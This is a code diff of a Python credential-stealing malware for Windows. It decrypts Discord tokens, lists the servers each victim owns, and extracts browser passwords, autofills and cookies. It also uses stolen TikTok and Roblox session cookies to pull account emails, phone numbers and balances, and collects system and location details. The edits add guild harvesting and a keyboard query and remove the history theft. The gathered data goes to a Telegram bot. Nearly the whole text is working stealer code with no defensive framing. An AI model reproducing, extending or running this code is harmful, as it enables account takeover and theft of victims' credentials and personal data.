@@ -1,21 +1,6 @@
 debug = False
 
-import os
-import re
-import sys
-import json
-import uuid
-import winreg
-import ctypes
-import base64
-import shutil
-import socket
-import base64
-import sqlite3
-import zipfile
-import platform
-import subprocess
-import ctypes.wintypes
+import os, re, sys, json, uuid, winreg, ctypes, base64, shutil, socket, base64, sqlite3, zipfile, platform, subprocess, ctypes.wintypes
 
 python_alias = sys.executable
 
@@ -37,10 +22,7 @@ os.makedirs(firefox_info, exist_ok=True)
 os.makedirs(softwares_info, exist_ok=True)
 os.makedirs(accounts_info, exist_ok=True)
 
-file_header = """
-   ꧁ঔৣ☬✞𝓢𝓟𝓔𝓛𝓛𝓑𝓞𝓤𝓝𝓓✞☬ঔৣ꧂
-\n\n
-"""
+file_header = "\n꧁ঔৣ☬✞𝓐𝓑𝓐𝓝𝓨✞☬ঔৣ꧂\n\n"
 
 class Sys:
     def InstallPackages(packages):
@@ -92,9 +74,9 @@ from Crypto.Cipher import AES
 total_discord_token = 0
 class Discord:
     def __init__(self):
-        self.discordRegexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
-        self.discordRegexpEnc = r"dQw4w9WgXcQ:[^\"]*"
-        self.discordCommonPaths = {'Discord': roaming + '\\discord\\Local Storage\\leveldb\\','Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\','Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\','Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\','Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo': localappdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch': localappdata + '\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa': localappdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum': localappdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser': localappdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star': localappdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik': localappdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi': localappdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS': localappdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome': localappdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1': localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2': localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3': localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4': localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5': localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser': localappdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge': localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\','Uran': localappdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium': localappdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
+        self.discord_regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
+        self.discord_regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
+        self.discord_common_paths = {'Discord': roaming + '\\discord\\Local Storage\\leveldb\\','Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\','Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\','Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\','Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo': localappdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch': localappdata + '\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa': localappdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum': localappdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser': localappdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star': localappdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik': localappdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi': localappdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS': localappdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome': localappdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1': localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2': localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3': localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4': localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5': localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser': localappdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge': localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\','Uran': localappdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium': localappdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
 
     @staticmethod
     def ValidateToken(token: str) -> bool:
@@ -138,7 +120,7 @@ class Discord:
     def GetDiscordTokens(self):
         discord_tokens = []
         discord_uids = []
-        for name, path in self.discordCommonPaths.items():
+        for name, path in self.discord_common_paths.items():
             if not os.path.exists(path): continue
             _discord = name.replace(" ", "").lower()
             if "cord" in path:
@@ -146,7 +128,7 @@ class Discord:
                 for file_name in os.listdir(path):
                     if file_name[-3:] not in ["log", "ldb"]: continue
                     for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for y in re.findall(self.discordRegexpEnc, line):
+                        for y in re.findall(self.discord_regexp_enc, line):
                             token = Discord.DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), Discord.GetMasterKey(roaming + f'\{_discord}\Local State'))
 
                             if Discord.ValidateToken(token):
@@ -159,7 +141,7 @@ class Discord:
                 for file_name in os.listdir(path):
                     if file_name[-3:] not in ["log", "ldb"]: continue
                     for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for token in re.findall(self.discordRegexp, line):
+                        for token in re.findall(self.discord_regexp, line):
                             if Discord.ValidateToken(token):
                                 uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                                 if uid not in discord_uids:
@@ -215,31 +197,141 @@ class Discord:
             final_to_return.append(final_message)
 
         return final_to_return
+    
+def CheckGuilds(token):
+    try:
+        guilds_formatted = []
+        headers = {"Authorization": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
+
+        response = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)
+        guilds_json = response.json()
+
+        for guild in guilds_json:
+            if guild["approximate_member_count"] < 1 or not (guild["owner"] or guild["permissions"] == "4398046511103"):
+                continue
+            
+            request = requests.get(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)
+            invites = request.json()
+
+            invite_code = invites[0]['code'] if invites else None
+
+            guilds_formatted.append(f"│⚔️ Guild Name: {guild['name']}\n│✉ Invite Link: {f'https://discord.gg/{invite_code}' if invite_code else 'Unavailable'}\n│🧾 Guild ID: {guild['id']}\n│👥 Members: {guild['approximate_member_count']}\n│🔑 Token: {token}\n├─────────────────────────────────────────────────────────\n")
+
+        return guilds_formatted if guilds_formatted else "what a shit account (* ￣︿￣)"
+    except Exception as e:
+        return e
 
 
 try:
     DiscordStealer = Discord()
-    tokens = DiscordStealer.ExtractInfosFromToken(DiscordStealer.GetDiscordTokens())
+    tokens_raw = DiscordStealer.GetDiscordTokens()
+    tokens_formatted = DiscordStealer.ExtractInfosFromToken(tokens_raw)
 
     with open(f"{discord_info}\\tokens.txt", "w", encoding="utf-8") as writer:
         writer.write(file_header)
         writer.write("┌─────────────────────────────────────────────────────────\n")
-        for token in tokens:
+        for token in tokens_formatted:
             writer.write(token)
             writer.write("├─────────────────────────────────────────────────────────\n")
             total_discord_token += 1
         
         writer.write("└─────────────────────────────────────────────────────────\n")
 
+    with open(f"{discord_info}\\guilds.txt", "w", encoding="utf-8") as writer:
+        writer.write(file_header)
+        writer.write("┌─────────────────────────────────────────────────────────\n")
+        for token in tokens_raw:
+            guilds = CheckGuilds(token)
+            for guild in guilds:
+                writer.write(guild)
+
+        writer.write("└─────────────────────────────────────────────────────────\n")
+
+
 except Exception as e:
     print(e)
 
 
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
+# ============================================================================================= COOKIES CLASS ======================================================================================================== #
+class CookieInfo:
+    @staticmethod
+    def Tiktok(cookie):
+        try:
+            email = ''
+            phone = ''
+            cookies = "sessionid=" + cookie
+            headers = {"cookie": cookies, "Accept-Encoding": "identity"}
+            headers2 = {"cookie": cookies}
+            url = 'https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE'
+            url2 = 'https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true'
+            
+            with requests.Session() as session:
+                response = session.get(url, headers=headers)
+                data = response.json()
+
+                response2 = session.get(url2, headers=headers2)
+                data2 = response2.json()
+
+            user_id = data["data"]["user_id"]
+            if not data["data"]["email"]:
+                email = "No Email"
+            else:
+                email = data["data"]["email"]
+            if not data["data"]["mobile"]:
+                phone = "No number"
+            else:
+                phone = data["data"]["mobile"]
+            username = data["data"]["username"]
+            coins = data2["data"]["coins"]
+
+            with open(f"{accounts_info}\\tiktok.txt", "a", encoding="utf-8") as writer:
+                writer.write(f"""│👤 Username: {username} ({user_id})
+│🌐 Email: {email}
+│📞 Phone: {phone}
+│💎 Coins: {coins}
+│📌 Profile URL: https://tiktok.com/@{username}
+│🍪 Cookie: {cookie}""")
+                
+        except Exception as e:
+            print(f"[Tiktok] {e}")
+
+    @staticmethod
+    def Roblox(cookie):
+        try:
+            headers = {'cookie':f'.ROBLOSECURITY={cookie}',"Accept-Encoding": "identity"}
+            with requests.Session() as session:
+                response = session.get("https://www.roblox.com/my/account/json", headers=headers)
+                res = response.json()
+
+                user_id = str(res['UserId'])
+
+                response2 = session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers)
+                res2 = response2.json()
+
+                response3 = session.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={user_id}&size=420x420&format=Png&isCircular=false", headers=headers)
+                res3 = response3.json()
+
+                id = res["UserId"]
+                name = res["Name"]
+                display_name = res["DisplayName"]
+                email = res["UserEmail"]
+                isEmailVerified = res["IsEmailVerified"]
+                robux = res2["robux"]
+
+                with open(f"{accounts_info}\\roblox.txt", "a", encoding="utf-8") as writer:
+                    writer.write(f"""│👤 Name: {display_name} ({name})
+│🌐 Email: {email}
+│💎 Robux: {robux}
+│🍪 Cookie: {cookie}""")
+
+        except:
+            print(f"[Roblox] {e}")
+
+# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
 # ============================================================================================= CHROMIUM ============================================================================================================= #
 total_passwords = 0
 total_autofills = 0
-total_history = 0
 total_cookies = 0
 
 class Chromium:
@@ -361,8 +453,9 @@ class Chromium:
 
                         cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                         tables = [table[0] for table in cursor.fetchall()]
+
                         if "autofill" in tables:
-                            cursor.execute("SELECT name, value FROM autofill")
+                            cursor.execute("SELECT name, value FROM autofill") 
                             autofills = cursor.fetchall()
 
                             for autofill in autofills:
@@ -381,21 +474,6 @@ class Chromium:
 
         return browser_autofills
 
-    def ExtractHistory(self):
-        browser_history = []
-        for browser in self.chromiumBrowsers:
-            Sys.KillProcess(browser["name"])
-            history_path = f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Default/History"
-            conn = sqlite3.connect(history_path)
-            cursor = conn.cursor()
-            cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC")
-            rows = cursor.fetchall()
-            conn.close()
-            for row in rows:
-                history_entry = f"│🌐 Url: {row[0]}\n│🔗 Title: {row[1]}\n├─────────────────────────────────────────────────────────\n"
-                browser_history.append(history_entry)
-
-        return browser_history
 
 ChromiumStealer = Chromium()
 try:
@@ -428,21 +506,6 @@ try:
         for autofill in autofills:
             writer.write(autofill)
             total_autofills += 1
-
-        writer.write("└─────────────────────────────────────────────────────────\n")
-
-except Exception as e:
-    print(e)
-
-try:
-    history = ChromiumStealer.ExtractHistory()
-
-    with open(f"{chromium_info}\\history.txt", "w", encoding="utf-8") as writer:
-        writer.write(file_header)
-        writer.write("┌─────────────────────────────────────────────────────────\n")
-        for entry in history:
-            writer.write(entry)
-            total_history += 1
 
         writer.write("└─────────────────────────────────────────────────────────\n")
 
@@ -496,25 +559,6 @@ class Firefox:
 
         return cookies_extracted
 
-    def ExtractHistory(self):
-        global total_history
-        history = []
-
-        try:
-            for files in self.files_path:
-                if "places" in files:
-                    database_connection = sqlite3.connect(files)
-                    cursor = database_connection.cursor()
-                    cursor.execute('SELECT url, title FROM moz_places ORDER BY last_visit_date DESC')
-                    history_raw = cursor.fetchall()
-                    for entry in history_raw:
-                        history.append(f"|🌐 Url: {entry[0]}\n|🔗 Title: {entry[1]}\n")
-                        total_history += 1
-        except:
-            print(f"[FirefoxHistory] {e}")
-        
-        return history
-
     def ExtractAutofills(self):
         global total_autofills
         autofills = []
@@ -524,90 +568,17 @@ class Firefox:
                 if "formhistory" in files:
                     database_connection = sqlite3.connect(files)
                     cursor = database_connection.cursor()
-                    cursor.execute("select * from moz_formhistory")
+                    cursor.execute("select fieldname, value from moz_formhistory")
+
                     autofills_raw = cursor.fetchall()
                     for entry in autofills_raw:
-                        autofills.append(f"{entry}\n")
+                        autofills.append(f"│👤 Name: {entry[0]}\n│🔑 Value: {entry[1]}\n")
                         total_autofills += 1
 
         except Exception as e:
             print(f"[FirefoxAutofills] {e}")
 
         return autofills
-
-class CookieInfo:
-    @staticmethod
-    def Tiktok(cookie):
-        try:
-            email = ''
-            phone = ''
-            cookies = "sessionid=" + cookie
-            headers = {"cookie": cookies, "Accept-Encoding": "identity"}
-            headers2 = {"cookie": cookies}
-            url = 'https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE'
-            url2 = 'https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true'
-            
-            with requests.Session() as session:
-                response = session.get(url, headers=headers)
-                data = response.json()
-
-                response2 = session.get(url2, headers=headers2)
-                data2 = response2.json()
-
-            user_id = data["data"]["user_id"]
-            if not data["data"]["email"]:
-                email = "No Email"
-            else:
-                email = data["data"]["email"]
-            if not data["data"]["mobile"]:
-                phone = "No number"
-            else:
-                phone = data["data"]["mobile"]
-            username = data["data"]["username"]
-            coins = data2["data"]["coins"]
-
-            with open(f"{accounts_info}\\tiktok.txt", "a", encoding="utf-8") as writer:
-                writer.write(f"""│👤 Username: {username} ({user_id})
-│🌐 Email: {email}
-│📞 Phone: {phone}
-│💎 Coins: {coins}
-│📌 Profile URL: https://tiktok.com/@{username}
-│🍪 Cookie: {cookie}""")
-                
-        except Exception as e:
-            print(f"[Tiktok] {e}")
-
-    @staticmethod
-    def Roblox(cookie):
-        try:
-            headers = {'cookie':f'.ROBLOSECURITY={cookie}',"Accept-Encoding": "identity"}
-            with requests.Session() as session:
-                response = session.get("https://www.roblox.com/my/account/json", headers=headers)
-                res = response.json()
-
-                user_id = str(res['UserId'])
-
-                response2 = session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers)
-                res2 = response2.json()
-
-                response3 = session.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={user_id}&size=420x420&format=Png&isCircular=false", headers=headers)
-                res3 = response3.json()
-
-                id = res["UserId"]
-                name = res["Name"]
-                display_name = res["DisplayName"]
-                email = res["UserEmail"]
-                isEmailVerified = res["IsEmailVerified"]
-                robux = res2["robux"]
-
-                with open(f"{accounts_info}\\roblox.txt", "a", encoding="utf-8") as writer:
-                    writer.write(f"""│👤 Name: {display_name} ({name})
-│🌐 Email: {email}
-│💎 Robux: {robux}
-│🍪 Cookie: {cookie}""")
-
-        except:
-            print(f"[Roblox] {e}")
 
 FirefoxStealer = Firefox()
 FirefoxStealer.ListProfiles()
@@ -628,21 +599,6 @@ except Exception as e:
     print(f"[FirefoxCookies] [Writer] {e}")
 
 try:
-    history = FirefoxStealer.ExtractHistory()
-
-    with open(f"{firefox_info}\\history.txt", "w", encoding="utf-8") as writer:
-        writer.write(file_header)
-        writer.write("┌─────────────────────────────────────────────────────────\n")
-        for entry in history:
-            writer.write(entry)
-            writer.write("├─────────────────────────────────────────────────────────\n")
-
-        writer.write("└─────────────────────────────────────────────────────────\n")
-
-except Exception as e:
-    print(f"[FirefoxHistory] [Writer] {e}")
-
-try:
     autofills = FirefoxStealer.ExtractAutofills()
 
     with open(f"{firefox_info}\\autofills.txt", "w", encoding="utf-8") as writer:
@@ -656,10 +612,6 @@ try:
 
 except Exception as e:
     print(f"[FirefoxAutofills] [Writer] {e}")
-
-
-# ______________________________________________________________________________________________________________________________________________________________________________________________________________________ #
-# ============================================================================================= ACCOUNTS =============================================================================================================== #
 
 
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
@@ -734,28 +686,31 @@ motherboard = subprocess.run(["wmic", "baseboard", "get", "product"], capture_ou
 disk = subprocess.run(["cmd", "/c", "wmic logicaldisk get caption,description,providername"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip()
 startup = subprocess.run(["cmd", "/c", "wmic startup get caption,command"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip()
 tasklist = subprocess.run(["cmd", "/c", "tasklist /svc"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip()
+keyboard = subprocess.run(["powershell", "(Get-WinUserLanguageList)[0].InputMethodTips"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850").stdout.strip()
 
 with open(f"{installation_folder}\\computer.txt", "w", encoding="utf-8") as writer:
     writer.write(file_header)
 
-    writer.write(f"""Computer :
-👤 Session@Computer: {session}@{computer_name}
-💻 OS: {os_version}
-🛠 Architecture: {architecture}
+    writer.write(f"""System Summary:
+   👤 Session@Computer: {session}@{computer_name}
+   🖥 OS: {os_version}
+   🛠 Architecture: {architecture}
+   📡 MAC: {mac}
+   📁 Running Path: {os.path.dirname(os.path.abspath(__file__))}
+   ⌨ Keyboard: {keyboard}
 
 Network :
-📡 MAC: {mac}
-📌 IP: {ip}
-🌍 Country: {country}
-🗺 Region: {region}
-🏠 City: {city}
-🧭 Localisation: {loc}
-⚡ Internet Provider: {org}
+   📌 IP: {ip}
+   🌍 Country: {country}
+   🗺 Region: {region}
+   🏠 City: {city}
+   🧭 Localisation: {loc}
+   ⚡ Internet Provider: {org}
 
 Hardware :
-⚙ CPU: {cpu}
-🔋  RAM: {ram}
-🖥 Motherboard: {motherboard}
+   ⚙ CPU: {cpu}
+   🔋  RAM: {ram}
+   🖥 Motherboard: {motherboard}
 
 Disk :
 {disk}
@@ -850,7 +805,6 @@ if not debug:
     🔵 Discord Account: {total_discord_token}
     ⌨ Passwords: {total_passwords}
     📑 Auto-fills: {total_autofills}
-    🗂 History: {total_history}
     🍪 Cookies: {total_cookies}"""
 
     url = f"https://api.telegram.org/bot{bot}/sendDocument"
